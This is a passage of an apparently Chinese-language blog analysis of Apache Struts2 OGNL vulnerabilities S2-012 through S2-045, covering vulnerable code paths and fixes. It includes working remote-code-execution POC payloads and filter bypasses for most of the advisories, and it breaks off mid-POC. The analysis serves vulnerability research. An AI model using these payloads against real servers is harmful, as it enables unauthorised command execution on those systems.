class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&amp;z[(password)(bla)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>改进了正则</p><p><img src="/images/talk_about_struts2/image-20200511222139049.png" alt="image-20200511222139049"></p><p>增加了<code>setParameter</code>函数，默认设置表达式不可执行</p><p><img src="/images/talk_about_struts2/image-20200511223638532.png" alt="image-20200511223638532"></p><p><img src="/images/talk_about_struts2/image-20200519154216690.png" alt="image-20200519154216690"></p><h2 id="7-S2-012"><a href="#7-S2-012" class="headerlink" title="7. S2-012"></a>7. S2-012</h2><p>影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p><blockquote><p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.<br>This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p></blockquote><p>看描述可以知道是struts2在处理redirect的时候出现的问题。</p><p><img src="/images/talk_about_struts2/image-20200513145252050.png" alt="image-20200513145252050"></p><p><img src="/images/talk_about_struts2/image-20200513145417046.png" alt="image-20200513145417046"></p><p>结果返回后回去调用<code>ServletRedirectResult</code>来处理</p><p>来看看该对象的实际处理函数<code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200513145546225.png" alt="image-20200513145546225"></p><p><img src="/images/talk_about_struts2/image-20200513150115678.png" alt="image-20200513150115678"></p><p>在父类execute函数调用了<code>conditionalParse</code>函数</p><p><img src="/images/talk_about_struts2/image-20200513150240332.png" alt="image-20200513150240332"></p><p>这里出现了我们比较熟悉的<code>TextParseUtil.translateVariables</code>，S2-001就是由这个函数来处理String类型转化的。</p><p>此时param为我们在struts.xml中的配置<code>edit.action?skillName=${currentSkill.name}</code></p><p>前面分析过<code>translateVariables</code>，这里直切主题</p><p>出问题的地方跟S2-001一样</p><p><img src="/images/talk_about_struts2/image-20200513151342610.png" alt="image-20200513151342610"></p><p>触发总共分为两步：</p><ol><li><p>将xml配置中<code>${currentSkill.name}</code>解析成传入的值，此时stack.findValue会去找到前面处理好后的Result里面的currentSkill.name的值</p><p><img src="/images/talk_about_struts2/image-20200513151651915.png" alt="image-20200513151651915"></p></li><li><p>由于<code>translateVariables</code>的解析OGNL表达式有两种<code>$</code>、<code>%</code>，并且是循环去处理的</p><p><img src="/images/talk_about_struts2/image-20200513151842698.png" alt="image-20200513151842698"></p><p>首先是去处理<code>$</code>，将<code>${currentSkill.name}</code>解析成具体的值，并且将result的值置为他的内容</p><p>虽然已经修复了循环递归执行的问题(s2-001会执行两层<code>${}</code>)，但是因为还循环去处理<code>%</code>，那么仍然可以达到循环递归计算的效果<code>${另一层以%起始的ognl表达式}</code>，所以POC里面需要用<code>%{}</code>来写入OGNL表达式</p></li></ol><p>所以对于S2-012来说，配置中<code>${currentSkill.name}</code>是至关重要的</p><h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>由于我前面分析的是<code>2.2.3</code>版本，后续的版本的<code>translateVariables</code>变化有点大，其修复版本</p><p><img src="/images/talk_about_struts2/image-20200513155116772.png" alt="image-20200513155116772"></p><p>增加了pos来做起始位置来查找<code>${}%{}</code>，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;</span><br><span class="line">// 回显POC</span><br><span class="line">%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="8-S2-013-S2-014"><a href="#8-S2-013-S2-014" class="headerlink" title="8. S2-013/S2-014"></a>8. S2-013/S2-014</h2><p>影响范围：Struts 2.0.0 - Struts 2.3.14.1</p><p>这次的原理跟S2-001类似，只是问题出在解析<code>&lt;s:a&gt;</code>、<code>&lt;s:url&gt;</code>，当这两个标签支持<code>includeParams</code></p><p><img src="/images/talk_about_struts2/image-20200514151446611.png" alt="image-20200514151446611"></p><p>当当前的href为空时，会用当前url来填充href，也就是在<code>buildUrl</code>时导致的OGNL表达式的执行</p><p>这里不具体分析了，看一下他的执行栈</p><p><img src="/images/talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;"></p><p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p><p><img src="/images/talk_about_struts2/image-20200514151844894.png" alt="image-20200514151844894"></p><p>也同样是使用String转换时出现的OGNL表达式执行</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&#125;</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&#125;</span><br></pre></td></tr></table></figure><h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p><img src="/images/talk_about_struts2/image-20200514152500049.png" alt="image-20200514152500049"></p><p><img src="/images/talk_about_struts2/image-20200514152517255.png" alt="image-20200514152517255"></p><p>这里<code>org.apache.struts2.views.util.DefaultUrlHelper</code>不再使用TextParseUtil来处理</p><h2 id="9-S2-015"><a href="#9-S2-015" class="headerlink" title="9. S2-015"></a>9. S2-015</h2><p>影响范围：Struts 2.0.0 - Struts 2.3.14.2</p><p>S2-015一共有两种：</p><p>第一种漏洞原理跟S2-012类似，这次问题不是出在重定向，而是在解析具体的action name时出现的问题</p><p><img src="/images/talk_about_struts2/image-20200514165546294.png" alt="image-20200514165546294"></p><p>这里的<code>{1}</code>会被替换成<code>xxx.action</code>的<code>xxx</code>，这里的<code>xxx</code>如果被我们替换成OGNL表达式，会在后续的<code>TextParseUtil.translateVariables</code>得到执行，过程跟S2-012一样，不再叙述。</p><p>第二种是结果由httpheader来处理时，会将我们的<code>${message}</code>嵌套执行</p><p><img src="/images/talk_about_struts2/image-20200514202040764.png" alt="image-20200514202040764"></p><p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200514202919865.png" alt="image-20200514202919865"></p><p>跟S2-012一样，解析执行<code>${另一层以%起始的OGNL表达式}</code></p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 摘自https://www.freebuf.com/vuls/217482.html</span><br><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br><span class="line">// 第二种</span><br><span class="line">？message=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><p>这里比较特殊的是这里对原有<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code>，改成了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原来的方式</span></span><br><span class="line">#_memberAccess['allowStaticMethodAccess']=true</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射机制来设置#_memberAccess['allowStaticMethodAccess']</span></span><br><span class="line">#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),</span><br><span class="line">#m.setAccessible(true),</span><br><span class="line">#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure><p>为什么要通过这种方式来写入呢？</p><p>先来看OGNL是怎么setValue的</p><p><code>ognl.OgnlRuntime#setFieldValue</code></p><p><img src="/images/talk_about_struts2/image-20200514173311368.png" alt="image-20200514173311368"></p><p>而此时这里我们要设置的<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code></p><p><img src="/images/talk_about_struts2/image-20200514173631503.png" alt="image-20200514173631503"></p><p>是final类型，我们不能使用普通的方式改变他的值，只能通过上面的反射的方式来进行修改。</p><p>这里的改变是从struts2 2.3.14.1版本开始的，意味着高于这个版本的以后的poc只能通过这种方式来设置</p><p>除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如<code>new ProccessBuilder(&#39;id&#39;).start()</code></p><h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>这里的修复就是S2-012的修复，主要修复了执行这种OGNL表达式<code>${另一层%起始的OGNL表达式}</code></p><h2 id="10-S2-016"><a href="#10-S2-016" class="headerlink" title="10. S2-016"></a>10. S2-016</h2><p>范围：Struts 2.0.0 - Struts 2.3.15</p><p>S2-016问题出在处理默认的<code>action:xxx</code>或<code>redirect:xxx</code>，后面跟的<code>xxx</code>为OGNL表达式，Struts2默认将用<code>ServletRedirectResult</code>来处理跳转问题，这里跟S2-012一样，只是这里的跳转设置在url里面</p><p>执行链路跟S2-012一样，不作分析了</p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code>默认的<code>redirect/redirectaction</code>直接被删除了</p><p><img src="/images/talk_about_struts2/image-20200515154730941.png" alt="image-20200515154730941"></p><p><code>action:</code>部分因为S2-015的关系，限制了action名</p><p><img src="/images/talk_about_struts2/image-20200515154855569.png" alt="image-20200515154855569"></p><p>已经不构成威胁了</p><h2 id="11-S2-019"><a href="#11-S2-019" class="headerlink" title="11. S2-019"></a>11. S2-019</h2><p>范围：Struts 2.0.0 - Struts 2.3.15.1</p><p>S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许使用command的模式来执行OGNL表达式</p><p>具体看S2-008</p><h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())</span><br></pre></td></tr></table></figure><h3 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a>修复</h3><p>这里后面的几个版本都是允许执行的，开发者模式下的command并没有被取消掉，所以如果在线上环境碰到debug模式，那就可以尝试一下OGNL表达式的执行</p><p>但是由于从struts2 2.3.20之后引入了黑名单模式（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），并且使用构造函数的方式也失效了</p><p>这里前辈们用到了将SecurityMemberAccess初始化的方式来绕过这个限制，原理可以好好看看这篇文章<a href="https://paper.seebug.org/794/#33-struts-2329。" target="_blank" rel="noopener">https://paper.seebug.org/794/#33-struts-2329。</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))</span><br></pre></td></tr></table></figure><p>后续还有一些绕过，后面再讲</p><h2 id="12-S2-029-S2-036"><a href="#12-S2-029-S2-036" class="headerlink" title="12. S2-029/S2-036"></a>12. S2-029/S2-036</h2><p>S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p><p>S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要在修复的地方讲）</p><p>原理跟S2-001差不多，S2-029的触发需要jsp用到标签<code>&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;</code>，name属性中由一OGNL表达式解析而得，意味着生成的input标签的name属性是动态计算而得的，比如?xxxx=username，此时解析得到的input.name为username。这其中执行了<code>%{xxxx}</code>，获得xxxx的内容。而S2-001的修复主要解决的是递归计算OGNL表达式的问题，S2-029就是在进入translateVariables之前就将第一层的OGNL表达式执行完毕</p><p><img src="/images/talk_about_struts2/image-20200519143433067.png" alt="image-20200519143433067"></p><p>直接看<code>UIBean.evaluateParams</code></p><p>首先计算<code>%{message}</code>到我们传入的OGNL表达式</p><p><img src="/images/talk_about_struts2/image-20200519144431546.png" alt="image-20200519144431546"></p><p>后续会在我们传入的OGNL表达式括上<code>%{xxx}</code></p><p><img src="/images/talk_about_struts2/image-20200519144525695.png" alt="image-20200519144525695"></p><p><img src="/images/talk_about_struts2/image-20200519144603429.png" alt="image-20200519144603429"></p><p>此时再传入到<code>findValue</code>就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可</p><h3 id="POC-8"><a href="#POC-8" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要先初始化SecurityMemberAccess，不然无法执行</span></span><br><span class="line">?message=((%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS).(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open+/System/Applications/Calculator.app'</span>)))</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?message=(%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>)),%<span class="number">23</span>q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>(%<span class="number">23</span>ret.getInputStream())</span><br><span class="line"> <span class="comment">// S2-036</span></span><br><span class="line"> ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))</span><br></pre></td></tr></table></figure><h3 id="修复S2-029"><a href="#修复S2-029" class="headerlink" title="修复S2-029"></a>修复S2-029</h3><p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p><p><img src="/images/talk_about_struts2/image-20200519152941105.png" alt="image-20200519152941105"></p><p>在计算表达式之前，验证是否可以执行</p><p><img src="/images/talk_about_struts2/image-20200519153530702.png" alt="image-20200519153530702"></p><p><img src="/images/talk_about_struts2/image-20200519153555655.png" alt="image-20200519153555655"></p><p>这里先看<code>node.isEvalChain</code>，这里是对S2-009做的限制，也就是当出现<code>((1)(2))</code>时，会解析出<code>ASTEval</code>节点，而<code>ASTEval</code>对象的<code>isEvalChain</code>函数直接返回true，也就使得<code>(1)(2)</code>无法执行</p><p>其次再来看<code>node.isSequence</code>，这里是对形如<code>(xxx1,xxx2,xxx3)</code>的OGNL表达式的限制，他将解析出<code>ASTSequence</code>节点，<code>ASTSequence</code>对象的<code>isSequence</code>直接返回true，也就限制了这种表达式的执行</p><p>然后比较有意思的是，对于形如<code>((xxx1).(xxx2).(xxx3))</code>的OGNL表达式，这是一种<code>ASTChain</code>，但其中并不会解析出<code>ASTEval</code></p><p>看前面的分析，知道可以将S2-029的修复bypass掉，也就是S2-036的问题</p><h2 id="13-S2-032-S2-033-S2-037"><a href="#13-S2-032-S2-033-S2-037" class="headerlink" title="13. S2-032/S2-033/S2-037"></a>13. S2-032/S2-033/S2-037</h2><p>影响范围：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>这里我的环境搭的是rest-showcase的，所以主要讲S2-033（S2-032的原理跟他差不多，只是触发变成了<code>method:#_xxxx</code>)</p><p>rest-plugin支持解析<code>xxx!method</code>的调用</p><p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code>解析<code>name!method</code>，并对当前的<code>restactionmapper</code>设置好后续要调用method</p><p><img src="/images/talk_about_struts2/image-20200520223124404.png" alt="image-20200520223124404"></p><p>在struts2的所有intercepter调用完毕后，会去调用DefaultActionInvocation的invokeActionOnly函数</p><p><img src="/images/talk_about_struts2/image-20200520223603177.png" alt="image-20200520223603177"></p><p>而invokeActionOnly会去调用<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p><p><img src="/images/talk_about_struts2/image-20200520223738228.png" alt="image-20200520223738228"></p><p>在这个函数里，我们可以看到他将前面可控的methodName放进了<code>ognlUtil.getValue</code>，导致了OGNL表达式的执行</p><p>需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启<code>devMode</code>的情况下进行利用的原因。</p><h3 id="POC-9"><a href="#POC-9" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// S2-037</span></span><br><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure><p>这里我们执行的命令用<code>#parameters.command[0]</code>的方式来获取，这是因为在生成<code>DefaultActionProxy</code>的时候对methodName做了转义处理，为了避免转义破坏OGNL表达式，用<code>#parameters</code>的方式从参数中获取。</p><p>还有一个需要注意的地方是，在最后调用<code>ognlUtil.getValue</code>时，在methodName后面拼接了<code>()</code>，我们需要将这个<code>()</code>做处理，比如这里的POC做的处理是<code>#xx.toString</code>去吃掉这个<code>()</code></p><h3 id="S2-032-S2-033修复"><a href="#S2-032-S2-033修复" class="headerlink" title="S2-032/S2-033修复"></a>S2-032/S2-033修复</h3><p><img src="/images/talk_about_struts2/image-20200520230704180.png" alt="image-20200520230704180"></p><p><code>xwork-core:2.3.28.1</code>在<code>OgnlUtil.isEvalExpression</code>增加了<code>isSequence</code>的判断</p><p>这里出现了新的一种利用方式<code>(1)?(2):(3)</code>，这种形式的OGNL表达式将有<code>ASTTest</code>对象来处理</p><p>而<code>isEvalChain()</code>和<code>isSequence()</code>限制的是<code>ASTEval</code>和<code>ASTSequence</code>对象，这里并没有对ASTTest做限制，并且由于<code>isSequence</code>并不是递归去判断的，所以在<code>ASTTest</code>的children节点上再出现<code>ASTSequence</code>也是ok的</p><p>根据这个原理，我们可以写出新的POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json</span><br></pre></td></tr></table></figure><h3 id="S2-037修复"><a href="#S2-037修复" class="headerlink" title="S2-037修复"></a>S2-037修复</h3><p><img src="/images/talk_about_struts2/image-20200520233839824.png" alt="image-20200520233839824"></p><p>在解析<code>name!method</code>的地方，调用了<code>cleanupActionName</code></p><p><img src="/images/talk_about_struts2/image-20200520233957407.png" alt="image-20200520233957407"></p><p>使用了正则，防止出现<code>(#@)</code>等特殊字符，出现就报错，也就到不了后续的OGNL表达式的执行</p><p>并且在禁止的class列表里增加了两个</p><p><img src="/images/talk_about_struts2/image-20200520234647887.png" alt="image-20200520234647887"></p><p>使得我们不能在用<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`来绕过限制</p><h3 id="一个有意思的地方"><a href="#一个有意思的地方" class="headerlink" title="一个有意思的地方"></a>一个有意思的地方</h3><p>前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的</p><p>前面说的几种方法都是在处理<code>name!method</code>这个格式，rest其实还支持对<code>action/id/method</code>的解析</p><p><img src="/images/talk_about_struts2/image-20200521112254951.png" alt="image-20200521112254951"></p><p>所以改改POC就能通杀rest-plugin了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure><h2 id="14-S2-045-S2-046"><a href="#14-S2-045-S2-046" class="headerlink" title="14. S2-045/S2-046"></a>14. S2-045/S2-046</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>S2-046原理一样，这里只分析S2-045</p><p>这里2.3和2.5版本变化比较大，这里以2.3.31的代码分析，看2.5的可以看<a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p><p>从struts2的工作流程图来看，所有的请求在生成ActionProxy之前，都由FilterDispatcher来处理，2.3版本用的是<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>，这里在调用action之前会先封装request。</p><p>看看调用栈</p><p><img src="/images/talk_about_struts2/image-20200521154143972.png" alt="image-20200521154143972"></p><p>封装实际由<code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code>处理</p><p><img src="/images/talk_about_struts2/image-20200521154319856.png" alt="image-20200521154319856"></p><p>可以看到这里在处理<code>Content-Type: multipart/form-data</code>类型时，会生成<code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>处理，S2-045就是出问题在这里</p><p><img src="/images/talk_about_struts2/image-20200521154524558.png" alt="image-20200521154524558"></p><p>在用<code>JakartaMultiPartRequest</code>解析request包时，调用<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>来检查Content-Type的内容，需要由multipart/开头才行，不然就是报错并将具体的contentType内容写到异常里</p><p><img src="/images/talk_about_struts2/image-20200521155036903.png" alt="image-20200521155036903"></p><p>这里我们的可控数据就到了异常上，就看struts2是怎么处理异常了</p><p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p><p><img src="/images/talk_about_struts2/image-20200521155309089.png" alt="image-20200521155309089"></p><p><img src="/images/talk_about_struts2/image-20200521155346720.png" alt="image-20200521155346720"></p><p>可控内容传入了<code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p><p><img src="/images/talk_about_struts2/image-20200521155451100.png" alt="image-20200521155451100"></p><p><img src="/images/talk_about_struts2/image-20200521155901705.png" alt="image-20200521155901705"></p><p>当前都没生成错误信息时，将获取默认的message</p><p><img src="/images/talk_about_struts2/image-20200521155825583.png" alt="image-20200521155825583"></p><p>这里到了我们熟悉的<code>TextParseUtil.translateVariables</code>函数，他后续会处理计算OGNL表达式</p><p>简单来说，整个过程从报错开始存入OGNL表达式，再生成错误信息的时候计算了OGNL表达式</p><p>到了这里执行可控的OGNL表达式是第一步，因为2.3.29增加了对<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`的限制</p><p>需要一种新的思路来绕过，S2-045的POC就给我们提供这样一个思路</p><h3 id="POC-10"><a href="#POC-10" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">(#_='multipart/form-data').</span><br><span 